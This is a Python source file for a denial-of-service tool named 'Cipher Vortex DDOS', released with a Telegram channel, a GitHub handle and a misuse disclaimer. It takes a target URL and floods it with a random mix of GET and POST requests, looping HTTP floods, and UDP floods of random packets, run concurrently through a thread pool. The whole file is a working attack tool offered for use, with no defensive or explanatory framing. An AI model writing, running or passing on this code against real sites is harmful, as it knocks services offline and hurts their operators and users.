import random
import time
import socket
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from ping3 import ping
from colorama import Fore, Style, init

init(autoreset=True)

Cipher_Vortex_ddos = """
 ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗     ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ ███████╗
██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║     ██║██████╔╝███████║█████╗  ██████╔╝    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝     ██║  ██║██║  ██║██║   ██║███████╗
██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗     ██║  ██║██║  ██║██║   ██║╚════██║
╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗    ██████╔╝██████╔╝╚██████╔╝███████║
 ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
"""

toolname = "Cipher Vortex DDOS - V1.0"
creator = "Created by Cipher security"
channel = "Telegram: @Cipher_security"
github = "github: Cipher1security"
disclaimer = "[!] We are not responsible for any misuse of this tool !"

async def test_connection(base_url):
    domain = base_url.split("//")[1].split("/")[0]
    response_time = ping(domain)
    if response_time is not None:
        print(Fore.GREEN + f"[+] Connection to {base_url} successful! Ping: {response_time * 1000:.2f} ms")
    else:
        print(Fore.RED + f"[-] Failed to connect to {base_url}")
    return response_time

async def send_get_request(url):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url) as response:
                print(Fore.CYAN + f"[+] GET Requested URL: {url} - Status Code: {response.status}")
        except Exception as e:
            print(Fore.RED + f"[-] Error requesting {url}: {e}")

async def send_post_request(url):
    async with aiohttp.ClientSession() as session:
        try:
            data = {"key": "value" * 1000}  
            async with session.post(url, data=data) as response:
                print(Fore.CYAN + f"[+] POST Requested URL: {url} - Status Code: {response.status}")
        except Exception as e:
            print(Fore.RED + f"[-] Error requesting {url}: {e}")

async def http_flood(url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        await send_get_request(url)  
        await asyncio.sleep(0.01)  

def udp_flood(url, duration):
    ip = url.split("//")[1].split("/")[0]
    port = 80  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  
    end_time = time.time() + duration

    while time.time() < end_time:
        sock.sendto(bytes, (ip, port))
        print(Fore.MAGENTA + f"[+] UDP Flooding {ip}:{port}")
        time.sleep(0.01)  

def validate_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        print(Fore.RED + "[!] Invalid URL. Please ensure it starts with http:// or https://.")
        return False
    return True

def validate_positive_integer(value):
    try:
        ivalue = int(value) 
        if ivalue < 0:
            print(Fore.RED + "[!] Please enter a non-negative integer.")
            return False
        return ivalue
    except ValueError:
        print(Fore.RED + "[!] Invalid input. Please enter a valid integer.")
        return False

async def main():
    print(Fore.BLUE + Style.BRIGHT + Cipher_Vortex_ddos)  
    print(Fore.LIGHTBLUE_EX + Style.BRIGHT + toolname)
    print(Fore.LIGHTGREEN_EX + creator)
    print(Fore.LIGHTGREEN_EX + channel)
    print(Fore.LIGHTGREEN_EX + github)
    print(Fore.RED + disclaimer)

    base_url = input(Fore.CYAN + "Enter the base URL (e.g., https://example.com): ")
    
    if not validate_url(base_url):
        return

    domain = base_url.split("//")[1].split("/")[0]
    ip_address = socket.gethostbyname(domain)
    print(Fore.GREEN + f"[+] IP Address of {base_url}: {ip_address}")

    ping_time = await test_connection(base_url)

    while True:
        number_of_requests = input(Fore.CYAN + "Enter the number of requests to send (0 to exit): ")
        number_of_requests = validate_positive_integer(number_of_requests)
        if number_of_requests is not False:
            if number_of_requests == 0:
                print(Fore.GREEN + "Exiting...")
                return
            break
    
    while True:
        delay = input(Fore.CYAN + "Enter the delay between requests (in seconds): ")
        delay = validate_positive_integer(delay)
        if delay is not False:
            break

    while True:
        udp_duration = input(Fore.CYAN + "Enter the duration for UDP flood (in seconds): ")
        udp_duration = validate_positive_integer(udp_duration)
        if udp_duration is not False:
            break

    while True:
        http_duration = input(Fore.CYAN + "Enter the duration for HTTP flood (in seconds): ")
        http_duration = validate_positive_integer(http_duration)
        if http_duration is not False:
            break

    request_types = ['GET', 'POST', 'HTTP_FLOOD', 'UDP_FLOOD']
    
    start_time = time.time()  

    tasks = []
    with ThreadPoolExecutor(max_workers=50) as executor:
        for i in range(number_of_requests):
            random_type = random.choice(request_types)
            
            if random_type == 'GET':
                tasks.append(asyncio.ensure_future(send_get_request(base_url)))
            elif random_type == 'POST':
                tasks.append(asyncio.ensure_future(send_post_request(base_url)))
            elif random_type == 'HTTP_FLOOD':
                tasks.append(asyncio.ensure_future(http_flood(base_url, http_duration)))
            elif random_type == 'UDP_FLOOD':
                executor.submit(udp_flood, base_url, udp_duration)

            print(Fore.YELLOW + f"[+] Sent request {i + 1}/{number_of_requests} to {base_url} as {random_type}")
            await asyncio.sleep(delay) 

    await asyncio.gather(*tasks)  

    end_time = time.time()  
    elapsed_time = end_time - start_time  

    print(Fore.GREEN + f"[+] All {number_of_requests} requests have been sent successfully.")
    print(Fore.GREEN + f"[+] Total time taken: {elapsed_time:.2f} seconds.")
    
    if ping_time is not None:
        print(Fore.GREEN + f"[+] Final Ping Time: {ping_time * 1000:.2f} ms")
    else:
        print(Fore.RED + "[-] Unable to determine final ping time.")

if __name__ == "__main__":
    asyncio.run(main())